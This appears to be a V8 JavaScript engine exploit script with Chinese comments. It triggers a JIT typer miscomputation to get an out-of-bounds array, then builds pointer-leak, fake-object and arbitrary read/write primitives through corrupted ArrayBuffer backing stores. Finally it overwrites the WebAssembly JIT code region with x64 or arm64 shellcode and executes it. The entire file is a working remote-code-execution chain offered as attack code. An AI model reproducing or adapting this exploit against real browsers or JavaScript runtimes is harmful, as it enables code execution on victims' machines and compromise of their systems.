const print = console.log;
const alert = console.log;
global.config = new Environment("linux", "x64", 64);
//硬偏移，需要版本适配

var kBufferOffset = 0x20;
var kCodeOffset = 0x30;
const IS_LITTLE_ENDIAN = true;

//ArrayBuffer对象的内存布局
const kArrayBufferMapOffset = 0;
const kArrayBufferLenOffset = 0x18;
const kArrayBufferBackingStoreOffset = 0x20;
const kArrayBufferSlotOffset = 0x40;

if(global.config.arch === "arm64") {
	var kMaxShellcodeLength = 201856;
} else if(global.config.arch === "x64") {
	var kMaxShellcodeLength = 0x1000; //TODO, 待确认
}

class ArrayBufferWithSlot extends ArrayBuffer {
	constructor(len) {
		super(len);
		this.slot = this;//用一个in-line的 field 存放指针
	}
}


try {
	//这个最好放在开头
	let [wasm_inst, wasm_func] = gen_wasm_inst_and_wasm_func();

	function achieve_oob_double_arr() {

		function evil_jit(arg_true) {
			let o = { c0: 0 };
			let c0a = arg_true ? 0 : "x";
			let c0 = (Math.max(c0a, 0) + c0a);
			let v01 = 2 ** 32 + (o.c0 & 1);
			let ra = ((2 ** 32 - 1) >>> c0) - v01;
			let rb = ((-1) << (32 - c0));
			let x = (ra ^ rb) >> 31; //typer以为是 0，实际是-1
			if (!arg_true) {
				x = 1; //typer: [0, 1], real: [-1, 1];
			}
			x = -x; //typer: [-1, 0], real: [-1, 1];
			x = x + 1; //typer: [0, 1], real: [0, 2];
			x = x >> 1; //typer: [0, 0], real: [0, 1];
			x = x * 1000; //typer: [0, 0], real: [0, 1000];
			x = x + 6; //typer: [6, 6], real: [6, 1006];
			let arr = new Array(x);
			arr[0] = 1.1;

			return arr;
		}

		for (var i = 0; i < 3e4; i++) evil_jit(true);

		let oob_double_arr = evil_jit(true);

		assertTrue(oob_double_arr.length === 1006);
		return oob_double_arr;
	}

	function find_offset(oob_arr, magic_value, end = -1) {
		if (end === -1) {
			end = oob_arr.length;
		}
		assertTrue(end > 0);
		for (var i = 11; i < end; i++) {
			let res = Int64.fromDouble(oob_arr[i]);
			// print(`${i*8}: res: ${res}, magic_value: ${magic_value}`);
			if (res.toString() === magic_value.toString()) {
				offset = i * 8;
				break;
			}
		}
		if (i === end) {
			throw new Error("找不到offset");
		}
		return offset;
	}

	class ExploitTools {
		constructor(achieve_oob_f) {
			this.kArbAbLen = 0x1000;

			this.ctrl_ab = null; //to be init later
			this.ctrl_view = null;//to be init later 
			this.arb_backing_store_cache = null; //to be init later

			this.arb_ab = new ArrayBufferWithSlot(this.kArbAbLen);
			this.arb_view = new DataView(this.arb_ab);

			//构建好所有需要的 exploit 原语
			let oob_arr = achieve_oob_f();

			const AB_LEN = 0x10000;
			this.ctrl_ab = new ArrayBufferWithSlot(AB_LEN);
			this.ctrl_view = new DataView(this.ctrl_ab);
			this.ctrl_ab.slot = this.arb_ab;

			let ctrl_ab_bak_store_offset = find_offset(oob_arr, new Int64(AB_LEN.toSmi()), 500) + 8;
			assertTrue(ctrl_ab_bak_store_offset % 8 == 0);
			console.log("ctrl_ab_bak_store_offset: 0x" + ctrl_ab_bak_store_offset.toString(16));

			let ctrl_ab_slot_offset = ctrl_ab_bak_store_offset + (kArrayBufferSlotOffset - kArrayBufferBackingStoreOffset)

			//修改 ctrl_ab 的backing store指向 arb_ab
			let arb_ab_addr = Sub(Int64.fromDouble(oob_arr[ctrl_ab_slot_offset / 8]), 1);
			oob_arr[ctrl_ab_bak_store_offset / 8] = arb_ab_addr.asDouble();


			this.arb_backing_store_cache = new Int64(this.ctrl_view.getBigUint64(kBufferOffset, true));

		}

		leakPtr(obj) {
			this.arb_ab.slot = obj;
			let uint64 = this.ctrl_view.getBigUint64(kArrayBufferSlotOffset, true);
			let i64 = new Int64(uint64);
			return Sub(i64, 1);
		}

		fakeObj(ptr) {
			this.ctrl_view.setBigUint64(kArrayBufferSlotOffset, Add(ptr, 1).asBigInt(), true);
			return this.arb_ab.slot;
		}

		//私有函数，不需要使用
		set_arb_backing_store(ptr) {
			this.ctrl_view.setBigUint64(kBufferOffset, ptr.asBigInt(), true);
			this.arb_backing_store_cache = ptr;
			// this.arb_view = new DataView(this.arb_ab);
		}

		getUint8(ptr) {
			var offset = Sub(ptr, this.arb_backing_store_cache);
			if (offset >= 0 && offset <= (this.arb_ab.byteLength - 1)) {
				return this.arb_view.getUint8(offset);
			}

			this.set_arb_backing_store(ptr);
			return this.getUint8(ptr);
		}

		getUint16(ptr) {
			var offset = Sub(ptr, this.arb_backing_store_cache);
			if (offset >= 0 && offset <= (this.arb_ab.byteLength - 2)) {
				return this.arb_view.getUint16(offset, true);
			}

			this.set_arb_backing_store(ptr);
			return this.getUint16(ptr);
		}

		getUint32(ptr) {
			var offset = Sub(ptr, this.arb_backing_store_cache);
			if (offset >= 0 && offset <= (this.arb_ab.byteLength - 4)) {
				return this.arb_view.getUint32(offset, true);
			}

			this.set_arb_backing_store(ptr);
			return this.getUint32(ptr);
		}

		getUint64(ptr) {
			var offset = Sub(ptr, this.arb_backing_store_cache);
			if (offset >= 0 && offset <= (this.arb_ab.byteLength - 8)) {
				return new Int64(this.arb_view.getBigUint64(offset, true));
			}

			this.set_arb_backing_store(ptr);
			return this.getUint64(ptr);
		}

		setUint8(ptr, value) {
			var offset = Sub(ptr, this.arb_backing_store_cache);
			if (offset >= 0 && offset <= (this.arb_ab.byteLength - 1)) {
				return this.arb_view.setUint8(offset, value);
			}

			this.set_arb_backing_store(ptr);
			return this.setUint8(ptr, value);
		}

		setUint16(ptr, value) {
			var offset = Sub(ptr, this.arb_backing_store_cache);
			if (offset >= 0 && offset <= (this.arb_ab.byteLength - 2)) {
				return this.arb_view.setUint16(offset, value, true);
			}

			this.set_arb_backing_store(ptr);
			return this.setUint16(ptr, value);
		}

		setUint32(ptr, value) {
			var offset = Sub(ptr, this.arb_backing_store_cache);
			if (offset >= 0 && offset <= (this.arb_ab.byteLength - 4)) {
				return this.arb_view.setUint32(offset, value, true);
			}

			this.set_arb_backing_store(ptr);
			return this.setUint32(ptr, value);
		}

		setUint64(ptr, value) {
			assertTrue(typeof value.asBigInt() === 'bigint');
			var offset = Sub(ptr, this.arb_backing_store_cache);
			if (offset >= 0 && offset <= (this.arb_ab.byteLength - 8)) {
				return this.arb_view.setBigUint64(offset, value.asBigInt(), true);
			}

			this.set_arb_backing_store(ptr);
			return this.setUint64(ptr, value);
		}
	}

	var oob = new ExploitTools(achieve_oob_double_arr);

	function test_oob_access() {
		let arr = [1.1, 2.2];

		let arr_addr = oob.leakPtr(arr);
		// console.log("arr_addr:" + arr_addr);
		//   %DebugPrint(arr);
		let faked_arr = oob.fakeObj(arr_addr);
		//   %DebugPrint(faked_arr);
		assertTrue(faked_arr[0] === 1.1);
		assertTrue(faked_arr[1] === 2.2);
	}

	test_oob_access();
	console.log("oob access 原语测试通过");

	// let victim_func = generate_huge_func();
	// //获取victim_func的 JIT 区域的地址
	// %DebugPrint(victim_func);
	// let victim_func_addr = new Int64(oob.leakPtr(victim_func));
	// let code_addr = Sub(oob.getUint64(Add(victim_func_addr, kCodeOffset)), 1);
	// let jit_addr = Add(code_addr, 0x40);
	// print("jit_addr:" + jit_addr);
	// %SystemBreak();

	//此时已经获得任意地址读写原语 


	//获取Wasm的JIT区域的地址


	let arch = global.config.arch;
	if (arch === "arm64") {
		let wasm_func_addr = oob.leakPtr(wasm_func);
		print("wasm_func_addr:" + wasm_func_addr);
		let js_to_wasm_func_jit_addr = Add(Sub(oob.getUint64(Add(wasm_func_addr, kCodeOffset)), 1), 0x40);
		print("js_to_wasm func jit addr:" + js_to_wasm_func_jit_addr);
		let shellcode = shellcode_arm64_exec;
		assertTrue(shellcode.length < kMaxShellcodeLength);
		for (let i = 0; i < shellcode.length; i++) {
			oob.setUint8(Add(js_to_wasm_func_jit_addr, i), shellcode[i].charCodeAt(0));
		}
	} else if (arch === "x64") {
		let wasm_func_addr = oob.leakPtr(wasm_func);
		let js_to_wasm_func_jit_addr = Add(Sub(oob.getUint64(Add(wasm_func_addr, kCodeOffset)), 1), 0x40);
		print("js_to_wasm func jit addr:" + js_to_wasm_func_jit_addr);
		let wasm_jit_addr = oob.getUint64(Add(js_to_wasm_func_jit_addr, 0x53));
		print("wasm_jit_addr:" + wasm_jit_addr);
		let shellcode = shellcode_x64_exec;
		assertTrue(shellcode.length < kMaxShellcodeLength);

		for (let i = 0; i < shellcode.length; i++) {
			oob.setUint8(Add(wasm_jit_addr, i), shellcode[i].charCodeAt(0));
		}
	} else {
		throw new Error("Invalid arch: " + arch);
	}


	console.log("exec shellcode");

	wasm_func();
} catch (e) {
	console.log(e.stack);
}